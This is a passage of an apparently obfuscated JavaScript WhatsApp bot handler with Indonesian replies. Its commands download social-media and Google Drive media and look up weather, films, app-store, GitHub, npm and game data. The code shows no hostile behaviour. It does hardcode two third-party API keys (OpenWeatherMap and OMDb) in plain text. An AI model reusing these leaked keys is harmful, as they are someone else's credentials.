            console.log(_0x4496a9);
            _0x3a091f("⚠️ Terjadi kesalahan saat mencari data di SoundCloud, coba lagi nanti ya!");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 'facebook':
      case 'fbdl':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Gunakan dengan format: \n" + (_0x4773c6 + _0x4ac520) + " <link_video>\n\nContoh:\n" + (_0x4773c6 + _0x4ac520) + " https://www.facebook.com/IrfanBrnsd/videos/559557717015956/");
          }
          try {
            _0x3a091f("⏳ Sedang memproses video, harap tunggu...");
            const _0x5b9d29 = await fdown.download(_0x2b2627);
            if (!_0x5b9d29.length) {
              return _0x3a091f("❌ Video tidak ditemukan atau link tidak valid!");
            }
            const _0x1d5b06 = _0x5b9d29[0x0];
            const _0x2e8f36 = "🎬 *Video Details:*\n\n📌 *Judul*: " + (_0x1d5b06.title || "Tidak diketahui") + "\n📝 *Deskripsi*: " + (_0x1d5b06.description || "Tidak tersedia") + "\n⏱ *Durasi*: " + (_0x1d5b06.duration || "Tidak diketahui");
            await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'image': {
                'url': _0x1d5b06.thumbnail || ''
              },
              'caption': _0x2e8f36
            }, {
              'quoted': _0x3f87c6
            });
            if (_0x1d5b06.hdQualityLink) {
              await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'video': {
                  'url': _0x1d5b06.hdQualityLink
                },
                'caption': "🎥 Video kualitas HD"
              }, {
                'quoted': _0x3f87c6
              });
            } else if (_0x1d5b06.normalQualityLink) {
              await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'video': {
                  'url': _0x1d5b06.normalQualityLink
                },
                'caption': "🎥 Video kualitas SD"
              }, {
                'quoted': _0x3f87c6
              });
            } else {
              _0x3a091f("❌ Gagal mengunduh video!");
            }
          } catch (_0x4d4776) {
            console.error(_0x4d4776);
            _0x3a091f("❌ Terjadi kesalahan saat memproses permintaan Anda. Pastikan link yang diberikan valid.");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "igstory":
      case "igs":
      case 'instagramstory':
      case "instastory":
      case "igslide":
      case "igphoto":
      case "instaphoto":
      case 'instafoto':
      case 'igfoto':
      case "instagram":
      case 'ig':
      case "igdl":
      case "igvideo":
      case 'instavideo':
      case "instavid":
      case "igreels":
      case "instareels":
      case 'instareel':
      case "igtv":
      case "instatv":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f("⚠️ Maaf Kak, limit Kamu sudah habis. Upgrade ke premium atau tunggu besok ya! 😊");
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚠️ Kirim perintah: " + (_0x4773c6 + _0x4ac520) + " <url>\n\n🤔 Contoh:\n" + (_0x4773c6 + _0x4ac520) + " https://www.instagram.com/reel/Cr5AXBQvBC1/?igshid=MzRlODBiNWFlZA==");
          }
          if (!/instagram.com/.test(_0x2b2627)) {
            return _0x3a091f("> Tolong masukkan link Instagram yang valid ya Kak! 🙏");
          }
          try {
            let _0x1e2fc2 = await Instagram(_0x2b2627);
            if (!_0x1e2fc2) {
              return _0x3a091f("❌ Gagal mendapatkan data dari link tersebut. Cek kembali link-nya ya, Kak!");
            }
            for (let _0x4d5111 of _0x1e2fc2.url) {
              let _0x12b2cb = await fetch(_0x4d5111);
              let _0x4db916 = Buffer.from(await _0x12b2cb.arrayBuffer());
              let _0x5a6919 = "「 *INSTAGRAM DL* 」\n\n";
              _0x5a6919 += "👤 *Username*: " + (_0x1e2fc2.metadata.username || "Tidak tersedia") + "\n";
              _0x5a6919 += "📝 *Caption*: " + (_0x1e2fc2.metadata.caption || "Tidak ada") + "\n";
              _0x5a6919 += "❤️ *Likes*: " + (_0x1e2fc2.metadata.like || 0x0) + "\n";
              _0x5a6919 += "💬 *Komentar*: " + (_0x1e2fc2.metadata.comment || 0x0) + "\n";
              _0x5a6919 += "🔗 *Sumber*: " + _0x2b2627;
              if (_0x1e2fc2.metadata.isVideo) {
                _0x59f5fa.sendFile(_0x3f87c6.chat, _0x4db916, "video.mp4", _0x5a6919, _0x3f87c6);
              } else {
                _0x59f5fa.sendFile(_0x3f87c6.chat, _0x4db916, "image.jpg", _0x5a6919, _0x3f87c6);
              }
            }
          } catch (_0x2a30fb) {
            console.error(_0x2a30fb);
            await _0x3a091f("❌ Terjadi kesalahan saat memproses permintaan. Coba lagi nanti ya, Kak! 🙏");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 'git':
      case "gitclone":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x143458[0x0]) {
            return _0x3a091f("📦 *Linknya mana, Kak?*\n\nContoh:\n" + _0x4773c6 + _0x4ac520 + " https://github.com/user/repo");
          }
          if (!isUrl(_0x143458[0x0]) || !_0x143458[0x0].includes("github.com")) {
            return _0x3a091f("❌ *Link tidak valid!* Pastikan link berasal dari GitHub ya, Kak.");
          }
          try {
            await _0x3f87c6.react('⏳');
            let _0x1c37fe = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i;
            let [, _0x5c1d2e, _0x41cbe2] = _0x143458[0x0].match(_0x1c37fe) || [];
            if (!_0x5c1d2e || !_0x41cbe2) {
              return _0x3a091f("❌ *Gagal membaca link repositori!* Pastikan link benar ya, Kak.");
            }
            _0x41cbe2 = _0x41cbe2.replace(/.git$/, '');
            let _0x37db94 = "https://api.github.com/repos/" + _0x5c1d2e + '/' + _0x41cbe2 + "/zipball";
            let _0x592449 = await fetch(_0x37db94, {
              'method': "HEAD"
            });
            let _0x8563b4 = _0x592449.headers.get("content-disposition")?.["match"](/attachment; filename=(.*)/)?.[0x1] || _0x41cbe2 + ".zip";
            await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'document': {
                'url': _0x37db94
              },
              'fileName': _0x8563b4,
              'mimetype': "application/zip"
            }, {
              'quoted': _0x3f87c6
            });
            _0x3a091f("✅ *Berhasil mengirim file repositori GitHub!*\nNama File: " + _0x8563b4);
          } catch (_0x22ae1a) {
            console.error(_0x22ae1a);
            _0x3a091f("❌ *Terjadi kesalahan saat mengunduh repositori!* 😭\n" + (_0x22ae1a.message || _0x22ae1a));
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
        }
        break;
      case "cuaca":
      case "weather":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("🌍 *Lokasinya mana, Kak?*\n\nContoh:\n" + _0x4773c6 + _0x4ac520 + " Jakarta");
          }
          try {
            await _0x3f87c6.react('⏳');
            let {
              data: _0x5e9548
            } = await axios.get("https://api.openweathermap.org/data/2.5/weather?q=" + _0x2b2627 + '&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&lang=id');
            let _0x4358c1 = "🌦️ *Informasi Cuaca di " + _0x5e9548.name + ", " + _0x5e9548.sys.country + "*\n";
            _0x4358c1 += "🌡️ *Suhu*: " + _0x5e9548.main.temp + "°C (Terasa seperti " + _0x5e9548.main.feels_like + "°C)\n";
            _0x4358c1 += "🌬️ *Kecepatan Angin*: " + _0x5e9548.wind.speed + " m/s\n";
            _0x4358c1 += "💧 *Kelembapan*: " + _0x5e9548.main.humidity + "%\n";
            _0x4358c1 += "🔄 *Tekanan Udara*: " + _0x5e9548.main.pressure + " hPa\n";
            _0x4358c1 += "📍 *Koordinat*: " + _0x5e9548.coord.lat + ", " + _0x5e9548.coord.lon + "\n";
            _0x4358c1 += "📝 *Deskripsi*: " + _0x5e9548.weather[0x0].description + "\n";
            await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'text': _0x4358c1
            }, {
              'quoted': _0x3f87c6
            });
            _0x3a091f("✅ *Informasi cuaca berhasil dikirim!*");
          } catch (_0x375aeb) {
            console.error(_0x375aeb);
            if (_0x375aeb.response && _0x375aeb.response.status === 0x194) {
              _0x3a091f("❌ *Lokasi tidak ditemukan!* Coba cek lagi nama lokasinya ya, Kak.");
            } else {
              _0x3a091f("❌ *Terjadi kesalahan saat mengambil data cuaca!* 😭\n" + (_0x375aeb.message || _0x375aeb));
            }
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case 'bukalapak':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚠️ Uh-oh, Kamu lupa kasih kata kunci nih! 🫣 Coba ketik kayak gini ya: *" + (_0x4773c6 + _0x4ac520) + " iPhone 15 Case* biar KoKoRey bisa bantu cari produknya! 🛒✨");
          }
          try {
            let _0x35f4a1 = await BukaLapak(_0x2b2627);
            if (!_0x35f4a1 || _0x35f4a1.length === 0x0) {
              return _0x3a091f("❌ Tidak ditemukan hasil untuk pencarian tersebut, coba kata kunci lain ya kak!");
            }
            let _0x2b8ce6 = "🛒 *Hasil Pencarian Bukalapak:*\n🔍 *Kata Kunci*: " + _0x2b2627 + "\n\n";
            _0x35f4a1.slice(0x0, 0x3).forEach((_0x366157, _0x4df3c8) => {
              _0x2b8ce6 += '*' + (_0x4df3c8 + 0x1) + ". " + _0x366157.title + "*\n";
              _0x2b8ce6 += "💵 *Harga*: " + _0x366157.harga + "\n";
              _0x2b8ce6 += "⭐ *Rating*: " + _0x366157.rating + "\n";
              _0x2b8ce6 += "📦 *Terjual*: " + _0x366157.terjual + "\n";
              _0x2b8ce6 += "📍 *Lokasi Toko*: " + _0x366157.store.lokasi + "\n";
              _0x2b8ce6 += "🏬 *Toko*: " + _0x366157.store.nama + "\n";
              _0x2b8ce6 += "🛒 *Link Toko*: " + _0x366157.store.link + "\n";
              _0x2b8ce6 += "🔗 *Link Produk*: " + _0x366157.link + "\n\n";
            });
            await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'image': {
                'url': _0x35f4a1[0x0].image
              },
              'caption': "🖼️ *Gambar Produk Pertama*: " + _0x35f4a1[0x0].title
            }, {
              'quoted': _0x3f87c6
            });
            await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'text': _0x2b8ce6
            }, {
              'quoted': _0x3f87c6
            });
          } catch (_0x19bd0c) {
            console.error("Error Bukalapak:", _0x19bd0c.response?.['data'] || _0x19bd0c.message);
            await _0x3a091f("❌ Terjadi kesalahan saat mengambil data dari Bukalapak. Coba lagi nanti ya kak!");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "playstore":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚠️ Uh-oh, Kamu lupa kasih kata kunci nih! 🫣 Coba ketik kayak gini ya: *" + (_0x4773c6 + _0x4ac520) + " WhatsApp* biar KoKoRey bisa bantu cari aplikasinya! 📲✨");
          }
          try {
            await _0x3f87c6.react('⏱️');
            let _0x2355f8 = await PlayStore(_0x2b2627);
            if (!_0x2355f8 || _0x2355f8.length === 0x0 || _0x2355f8.message) {
              return _0x3a091f("❌ Tidak ditemukan hasil untuk pencarian tersebut, coba kata kunci lain ya kak!");
            }
            let _0x1f800f = "📲 *Hasil Pencarian Play Store:*\n🔍 *Kata Kunci*: " + _0x2b2627 + "\n\n";
            _0x2355f8.slice(0x0, 0x3).forEach((_0x4fd5bc, _0x6cc912) => {
              _0x1f800f += '*' + (_0x6cc912 + 0x1) + ". " + _0x4fd5bc.nama + "*\n";
              _0x1f800f += "👤 *Developer*: " + _0x4fd5bc.developer + "\n";
              _0x1f800f += "⭐ *Rating*: " + _0x4fd5bc.rate + "\n";
              _0x1f800f += "🔗 *Link*: " + _0x4fd5bc.link + "\n";
              _0x1f800f += "🏢 *Link Developer*: " + _0x4fd5bc.link_dev + "\n\n";
            });
            await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'image': {
                'url': _0x2355f8[0x0].img
              },
              'caption': "🖼️ *Gambar Aplikasi Pertama*: " + _0x2355f8[0x0].nama
            }, {
              'quoted': _0x3f87c6
            });
            await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'text': _0x1f800f
            }, {
              'quoted': _0x3f87c6
            });
          } catch (_0x2b0dca) {
            console.error("Error Play Store:", _0x2b0dca.response?.["data"] || _0x2b0dca.message);
            await _0x3a091f("❌ Terjadi kesalahan saat mengambil data dari Play Store. Coba lagi nanti ya kak!");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "umma":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚠️ Gunakan dengan cara: " + (_0x4773c6 + _0x4ac520) + " *url artikel*");
          }
          try {
            const _0x1de94c = await umma(_0x2b2627);
            _0x3a091f("📖 *Artikel*: " + _0x1de94c.title + "\n\n👤 *Penulis*: " + _0x1de94c.author.name + "\n💬 *Caption*: " + _0x1de94c.caption + "\n\n🔗 *Sumber*: " + _0x2b2627);
          } catch (_0x46cb9c) {
            console.error(_0x46cb9c);
            _0x3a091f("❌ Ada masalah waktu ambil artikel dari Umma, Kak! Coba lagi nanti ya 🥺");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "githubstalk":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚠️ Gunakan dengan cara: " + (_0x4773c6 + _0x4ac520) + " *username github*\n\n🤔 *Contohnya:*\n\n" + (_0x4773c6 + _0x4ac520) + " KoKoRey");
          }
          try {
            const _0x4168c3 = await githubstalk(_0x2b2627);
            console.log(_0x4168c3);
            _0x3a091f("🧑‍💻 *Username*: " + (_0x4168c3.username || "Anonim") + "\n🌟 *Nickname*: " + (_0x4168c3.nickname || "Anonim") + "\n📝 *Bio*: " + (_0x4168c3.bio || "Tidak tersedia") + "\n🆔 *ID*: " + _0x4168c3.id + "\n🔑 *NodeID*: " + _0x4168c3.nodeId + "\n🔗 *Url*: " + _0x4168c3.url + "\n🏷️ *Type*: " + _0x4168c3.type + "\n👑 *Admin*: " + (_0x4168c3.admin ? 'Ya' : 'Tidak') + "\n🏢 *Company*: " + (_0x4168c3.company || "Tidak ada") + "\n🌐 *Blog*: " + (_0x4168c3.blog || "Tidak ada") + "\n📍 *Location*: " + (_0x4168c3.location || "Tidak diketahui") + "\n📧 *Email*: " + (_0x4168c3.email || "Tidak tersedia") + "\n📚 *Public Repo*: " + _0x4168c3.public_repo + "\n🎁 *Public Gists*: " + _0x4168c3.public_gists + "\n👥 *Followers*: " + _0x4168c3.followers + "\n➕ *Following*: " + _0x4168c3.following + "\n🕰️ *Created At*: " + _0x4168c3.created_at + "\n🔄 *Updated At*: " + _0x4168c3.updated_at);
          } catch (_0x3be6dd) {
            console.error(_0x3be6dd);
            _0x3a091f("❌ Ada masalah waktu ambil data GitHub, Kak! Coba lagi nanti ya 🥺");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "npmstalk":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚠️ Gunakan dengan cara: " + (_0x4773c6 + _0x4ac520) + " *nama package npm*\n\n🤔 *Contohnya:*\n\n" + (_0x4773c6 + _0x4ac520) + " axios");
          }
          try {
            const _0x45c140 = await npmstalk(_0x2b2627);
            _0x3a091f("📦 *Package*: " + _0x45c140.name + "\n🔢 *Versi Terbaru*: " + _0x45c140.versionLatest + "\n📅 *Waktu Terbit*: " + _0x45c140.publishTime + "\n🔧 *Dependencies Terbaru*: " + _0x45c140.latestDependencies);
          } catch (_0x21754d) {
            console.error(_0x21754d);
            _0x3a091f("❌ Ada masalah waktu ambil data dari NPM, Kak! Coba lagi nanti ya 🥺");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "ffchars":
        if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
          return _0x3a091f(mess.limit);
        }
        let _0x155655 = await ffCh();
        let _0x56020d = _0x155655.map((_0x5e087d, _0x1ada91) => _0x1ada91 + 0x1 + ". 🎮 *" + _0x5e087d.name + "*\n💬 " + _0x5e087d.desc + "\n🔗 Link: https://ff.garena.com/id/chars/" + _0x5e087d.id).join("\n\n");
        await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
          'text': "*Daftar Karakter Free Fire:*\n\n" + _0x56020d
        }, {
          'quoted': _0x3f87c6
        });
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "ffcharinfo":
        if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
          return _0x3a091f(mess.limit);
        }
        let _0x161d6d = _0x2b2627.split(" ")[0x1];
        if (!_0x161d6d) {
          return _0x3a091f("⚠️ ID karakter tidak ditemukan!");
        }
        let _0x3d13f9 = await ffChSkill(_0x161d6d);
        let _0x242d62 = _0x3d13f9.map(_0x333730 => "*Judul*: " + _0x333730.title + "\n*Name*: " + _0x333730.name + "\n*Skill*: " + _0x333730.skill).join("\n\n");
        await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
          'text': _0x242d62
        }, {
          'quoted': _0x3f87c6
        });
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "ffnews":
        if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
          return _0x3a091f(mess.limit);
        }
        let _0x2e198e = await ffNews();
        let _0x122d06 = _0x2e198e.map(_0x213436 => "📰 *" + _0x213436.title + "*\n🕒 *" + _0x213436.time + "*\n🔗 Link: " + _0x213436.link).join("\n\n");
        await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
          'text': "*Berita Free Fire Terbaru:*\n\n" + _0x122d06
        }, {
          'quoted': _0x3f87c6
        });
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case 'ffpets':
        if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
          return _0x3a091f(mess.limit);
        }
        let _0x50eea3 = await ffPet();
        let _0x452c58 = _0x50eea3.map((_0x5c1bf1, _0x2c5aa1) => _0x2c5aa1 + 0x1 + ". 🐾 *" + _0x5c1bf1.name + "*\n💬 " + _0x5c1bf1.talk + "\n🔗 Link: https://ff.garena.com/id/pets/" + _0x5c1bf1.id).join("\n\n");
        await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
          'text': "*Daftar Pet Free Fire:*\n\n" + _0x452c58
        }, {
          'quoted': _0x3f87c6
        });
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "ffpetskill":
        if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
          return _0x3a091f(mess.limit);
        }
        let _0x53c73a = _0x2b2627.split(" ")[0x1];
        if (!_0x53c73a) {
          return _0x3a091f("⚠️ ID pet tidak ditemukan!");
        }
        let _0x34937e = await ffPetSkill(_0x53c73a);
        let _0x3ef3db = _0x34937e.map(_0x2f15e6 => "*Name*: " + _0x2f15e6.name + "\n*Skill*: " + _0x2f15e6.skill).join("\n\n");
        await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
          'text': _0x3ef3db
        }, {
          'quoted': _0x3f87c6
        });
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "mlstalk":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚠️ Gunakan dengan cara: " + (_0x4773c6 + _0x4ac520) + " *gameId zoneId*\n\n🤔 *Contohnya:*\n\n" + (_0x4773c6 + _0x4ac520) + " 12345 1");
          }
          const [_0x1706bb, _0x12f2ad] = _0x2b2627.split(" ");
          try {
            const _0x585aad = await mlstalk(_0x1706bb, _0x12f2ad);
            _0x3a091f("🎮 *Game*: " + _0x585aad.userName + "\n🛒 *Harga*: " + (_0x585aad.price || '0') + "\n🔗 " + (_0x585aad.topUpUrl || "URL tidak ada."));
          } catch (_0x41ff13) {
            console.error(_0x41ff13);
            _0x3a091f("❌ Ada masalah waktu ambil data dari DuniaGames, Kak! Coba lagi nanti ya 🥺");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case 'imdb':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("🎬 *Judul film atau serialnya mana, Kak?*\n\nContoh:\n" + _0x4773c6 + _0x4ac520 + " Inception");
          }
          try {
            await _0x3f87c6.react('⏳');
            let {
              data: _0x291969
            } = await axios.get('http://www.omdbapi.com/?apikey=742b2d09&t=' + encodeURIComponent(_0x2b2627) + '&plot=full');
            if (_0x291969.Response === 'False') {
              return _0x3a091f("❌ *Film atau serial tidak ditemukan!* Coba cek lagi judulnya ya, Kak.");
            }
            let _0x5e5c7f = "🎬 *Judul*: " + _0x291969.Title + "\n";
            _0x5e5c7f += "📅 *Tahun*: " + _0x291969.Year + "\n";
            _0x5e5c7f += "⭐ *Rating*: " + _0x291969.Rated + "\n";
            _0x5e5c7f += "📆 *Rilis*: " + _0x291969.Released + "\n";
            _0x5e5c7f += "⏳ *Durasi*: " + _0x291969.Runtime + "\n";
            _0x5e5c7f += "🌀 *Genre*: " + _0x291969.Genre + "\n";
            _0x5e5c7f += "👨‍💼 *Sutradara*: " + _0x291969.Director + "\n";
            _0x5e5c7f += "✍️ *Penulis*: " + _0x291969.Writer + "\n";
            _0x5e5c7f += "👥 *Aktor*: " + _0x291969.Actors + "\n";
            _0x5e5c7f += "📖 *Plot*: " + _0x291969.Plot + "\n";
            _0x5e5c7f += "🌐 *Bahasa*: " + _0x291969.Language + "\n";
            _0x5e5c7f += "🌍 *Negara*: " + _0x291969.Country + "\n";
            _0x5e5c7f += "🏆 *Penghargaan*: " + _0x291969.Awards + "\n";
            _0x5e5c7f += "💵 *Box Office*: " + (_0x291969.BoxOffice || '-') + "\n";
            _0x5e5c7f += "🏙️ *Produksi*: " + (_0x291969.Production || '-') + "\n";
            _0x5e5c7f += "🌟 *IMDb Rating*: " + _0x291969.imdbRating + "\n";
            _0x5e5c7f += "✅ *IMDb Votes*: " + _0x291969.imdbVotes + "\n";
            await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'image': {
                'url': _0x291969.Poster || "https://via.placeholder.com/300x450?text=No+Poster"
              },
              'caption': _0x5e5c7f
            }, {
              'quoted': _0x3f87c6
            });
            _0x3a091f("✅ *Berhasil menampilkan informasi film!*");
          } catch (_0x309e68) {
            console.error(_0x309e68);
            _0x3a091f("❌ *Terjadi kesalahan saat mencari film!* 😭\n" + (_0x309e68.message || _0x309e68));
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case 'gddl':
      case "gdrivedl":
      case "gdrive":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Gunakan dengan cara " + (_0x4773c6 + _0x4ac520) + " <url>");
          }
          if (!_0x2b2627.includes('drive')) {
            return _0x3a091f("Link nggak valid");
          }
          try {
            const _0x3ea6df = await GDriveDl(_0x2b2627);
            if (_0x3ea6df.error) {
              return _0x3a091f("URL tidak valid, periksa ulang apakah akses ke URL sudah public?");
            }
            _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'document': {
                'url': _0x3ea6df.downloadUrl
              },
              'mimetype': _0x3ea6df.mimetype,
              'fileName': _0x3ea6df.fileName,
              'caption': "*GOOGLE DRIVE*\n\n*Nama*: " + _0x3ea6df.fileName + "\n*Size*: " + _0x3ea6df.fileSize + "\n*Type*: " + _0x3ea6df.mimetype
            }, {
              'quoted': _0x3f87c6
            });
          } catch (_0x482423) {
            console.log(_0x482423);
            _0x3a091f("Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.");
          }
          ;
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "pinterest":
      case "pin":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Enter Query!");
          }
          await _0x3f87c6.react('⏱️');
          async function _0x25d416(_0x2e38df) {
            const {
              imageMessage: _0x5792bc
            } = await generateWAMessageContent({
              'image': {
                'url': _0x2e38df
              }
            }, {
              'upload': _0x59f5fa.waUploadToServer
            });
            return _0x5792bc;
          }
          function _0x4804e3(_0x394b01) {
            for (let _0x470b7c = _0x394b01.length - 0x1; _0x470b7c > 0x0; _0x470b7c--) {
              const _0x549a37 = Math.floor(Math.random() * (_0x470b7c + 0x1));
              [_0x394b01[_0x470b7c], _0x394b01[_0x549a37]] = [_0x394b01[_0x549a37], _0x394b01[_0x470b7c]];
            }
          }
          let _0x423df2 = [];
          let _0xa2de10 = await pinterest(_0x2b2627);
          _0x4804e3(_0xa2de10);
          let _0x3d383d = _0xa2de10.slice(0x0, 0x5);
          let _0x485f9f = 0x1;
          for (let _0x27f136 of _0x3d383d) {
            _0x423df2.push({
              'body': proto.Message.InteractiveMessage.Body.fromObject({
                'text': "👤 *Diunggah oleh*: " + _0x27f136.upload_by + "\n" + ("📛 *Nama Lengkap*: " + _0x27f136.fullname + "\n") + ("👥 *Pengikut*: " + _0x27f136.followers + "\n") + ("📝 *Caption*: " + _0x27f136.caption)
              }),
              'footer': proto.Message.InteractiveMessage.Footer.fromObject({
                'text': footer
              }),
              'header': proto.Message.InteractiveMessage.Header.fromObject({
                'title': "*Gambar* - " + _0x485f9f++,
                'hasMediaAttachment': true,
                'imageMessage': await _0x25d416(_0x27f136.image)
              }),
              'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                'buttons': [{
                  'name': "cta_url",
                  'buttonParamsJson': "{\n\t\t\t\t\t\t\t\t\t\t\"display_text\": \"View Source 👀\",\n\t\t\t\t\t\t\t\t\t\t\"url\": \"" + _0x27f136.source + "\", \n\t\t\t\t\t\t\t\t\t\t\"merchant_url\": \"" + _0x27f136.source + "\"\n\t\t\t\t\t\t\t\t\t}"
                }]
              })
            });
          }
          const _0x144535 = generateWAMessageFromContent(_0x3f87c6.chat, {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': {
                  'deviceListMetadata': {},
                  'deviceListMetadataVersion': 0x2
                },
                'interactiveMessage': proto.Message.InteractiveMessage.fromObject({
                  'body': proto.Message.InteractiveMessage.Body.create({
                    'text': mess.done
                  }),
                  'footer': proto.Message.InteractiveMessage.Footer.create({
                    'text': footer
                  }),
                  'header': proto.Message.InteractiveMessage.Header.create({
                    'hasMediaAttachment': false
                  }),
                  'carouselMessage': proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                    'cards': [..._0x423df2]
                  })
                })
              }
            }
          }, {
            'quoted': _0x3f87c6
          });
          await _0x59f5fa.relayMessage(_0x3f87c6.chat, _0x144535.message, {
            'messageId': _0x144535.key.id
          });
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "savepin":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Example: " + (_0x4773c6 + _0x4ac520) + " https://pin.it/34Gef3SlC");
          }
          if (!_0x2b2627.includes("pin")) {
            return _0x3a091f("Link Invalid!!");
          }
          try {
            await _0x3f87c6.react('⏱️');
            const _0x5526f7 = await savePin(_0x2b2627);
            const {
              title: _0x366506,
              results: _0x36bfa1
            } = _0x5526f7;
            let _0x1d7f79 = _0x36bfa1[0x0];
            let _0x422fe3 = "✨ *Judul*: " + _0x366506 + "\n📥 *Type*: " + _0x1d7f79.type + "\n📁 *Format*: " + _0x1d7f79.format;
            if (_0x1d7f79.format === "MP4") {
              await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'caption': _0x422fe3,
                'video': {
                  'url': _0x1d7f79.downloadLink
                }
              }, {
                'quoted': _0x3f87c6
              });
            } else {
              if (_0x1d7f79.format === 'JPG') {
                await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                  'caption': _0x422fe3,
                  'image': {
                    'url': _0x1d7f79.downloadLink
                  }
                }, {
                  'quoted': _0x3f87c6
                });
              } else {
                return _0x3a091f("Format media tidak didukung.");
              }
            }
          } catch (_0x486ceb) {
            console.error(_0x486ceb);
            _0x3a091f("Terjadi kesalahan saat memproses permintaan.");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "quoteanime":
      case "animequote":
      case 'quotesanime':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          try {
            let _0x200f95 = await quotesAnime();
            if (!_0x200f95 || _0x200f95.length === 0x0) {
              return _0x3a091f("⚠️ Wah, KoKoRey gak nemu quote anime nih, Kak! Coba lagi nanti ya 🥲");
            }
            let _0x5d49ac = _0x200f95[Math.floor(Math.random() * _0x200f95.length)];
            await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'image': {
                'url': _0x5d49ac.gambar
              },
